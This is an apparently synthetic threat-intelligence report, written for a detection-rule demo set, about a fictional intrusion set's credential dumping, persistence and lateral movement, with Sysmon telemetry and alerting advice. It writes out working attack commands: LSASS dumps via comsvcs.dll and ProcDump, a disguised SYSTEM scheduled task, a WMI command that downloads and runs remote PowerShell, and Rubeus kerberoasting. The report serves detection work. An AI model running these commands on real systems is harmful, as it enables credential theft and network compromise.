# Post-exploitation tradecraft of the "Saltmarsh" intrusion set: credential theft, scheduled-task persistence and lateral movement

> Synthetic report written for RuleSmith's offline demo and evaluation set. The techniques mirror widely published public reporting; the intrusion set, hosts and hashes are fictional.

## Summary

Saltmarsh is a financially motivated intrusion set that gains initial access through purchased VPN credentials and then moves quickly to domain-wide compromise. This report documents the post-exploitation tradecraft observed across four incidents in September and October 2026, with emphasis on behaviours that are detectable in Sysmon and Windows Security telemetry.

## Credential access: LSASS memory dumps

In every incident the operators dumped LSASS memory using the Windows-native `comsvcs.dll` MiniDump export, avoiding the need to bring their own tooling:

```
rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump 712 C:\Users\Public\lsass.dmp full
```

The process id argument corresponded to `lsass.exe`. The dump file was written to `C:\Users\Public\` or `C:\Windows\Temp\` with names such as `lsass.dmp`, `debug.dmp` or `1.dmp`. On two hosts the operators used a renamed copy of Sysinternals ProcDump instead (`C:\Windows\Temp\pd.exe -accepteula -ma lsass.exe C:\Windows\Temp\1.dmp`), where the file name changed but the `OriginalFileName` metadata remained `procdump`. Sysmon event 10 recorded `GrantedAccess` of `0x1FFFFF` to `lsass.exe` from `rundll32.exe` and from the renamed ProcDump, with `CallTrace` entries referencing `dbghelp.dll` and `dbgcore.dll`.

## Persistence: scheduled task with a PowerShell action

Persistence was established with a scheduled task whose name imitates Windows maintenance tasks and whose action is PowerShell loading a payload from a hidden ProgramData folder:

```
schtasks.exe /create /tn "\Microsoft\Windows\UpdateOrchestrator\UpdateHealth" /sc hourly /ru SYSTEM /tr "powershell.exe -nop -w hidden -ep bypass -f C:\ProgramData\.cache\uh.ps1" /f
```

Windows Security event 4698 recorded the task creation with the full task XML. Legitimate scheduled tasks in the affected environments were created by `svchost.exe` (Windows Update), the Google and Microsoft updaters, and the SCCM client; none had PowerShell actions pointing at `C:\ProgramData` or `C:\Users\Public`.

## Lateral movement: PsExec and WMI

The operators used a PsExec clone and WMI for remote execution. PsExec usage produced a service installation (System event 7045) with `ServiceName` of `PSEXESVC` and `ImagePath` of `%SystemRoot%\PSEXESVC.exe`, followed by Sysmon event 17 and 18 named-pipe events for `\PSEXESVC` and `\psexecsvc-<host>-<pid>-stdin`. The service binary was later observed under randomised names (`\\host\ADMIN$\jkl8s2.exe`) but the named-pipe pattern persisted.

WMI remote execution appeared as:

```
wmic.exe /node:FS-02 /user:CORP\adm-jpark /password:******** process call create "cmd.exe /c powershell -nop -w hidden -c IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.7:8080/a')"
```

On the target, `WmiPrvSE.exe` spawned `cmd.exe` and `powershell.exe`, a parent-child relationship absent from baseline telemetry.

Remote service creation was also used directly:

```
sc.exe \\FS-02 create svcupd binPath= "C:\Windows\Temp\s.exe" start= auto
sc.exe \\FS-02 start svcupd
```

## Kerberoasting and Active Directory collection

Service tickets were requested for every SPN-bearing account using Rubeus (`Rubeus.exe kerberoast /format:hashcat /outfile:C:\Windows\Temp\k.txt`), producing bursts of Security event 4769 with `TicketEncryptionType` of `0x17` (RC4) from a single workstation, where the environment otherwise issued AES tickets (`0x12`). SharpHound was then run (`SharpHound.exe -c All --zipfilename c.zip`) to collect Active Directory relationships, generating LDAP queries with the distinctive `(samAccountType=805306368)` filter from a non-administrative workstation.

## Indicators

| Type | Value |
|---|---|
| Path | C:\Users\Public\lsass.dmp, C:\ProgramData\.cache\uh.ps1 |
| Task name | \Microsoft\Windows\UpdateOrchestrator\UpdateHealth |
| Service name | PSEXESVC, svcupd |
| IP | 10.10.14.7 (operator relay inside the victim network) |

## Recommendations

Alert on `rundll32.exe` with `comsvcs.dll` and `MiniDump` in the command line, on any process accessing `lsass.exe` with `0x1FFFFF` access whose image is not a known security product, on binaries with `OriginalFileName` `procdump` targeting `lsass`, on scheduled tasks whose action runs PowerShell from `C:\ProgramData` or `C:\Users\Public`, on `PSEXESVC` service installs and named pipes, on `WmiPrvSE.exe` spawning command shells, on `sc.exe` with a UNC target creating services, and on bursts of RC4 service-ticket requests.
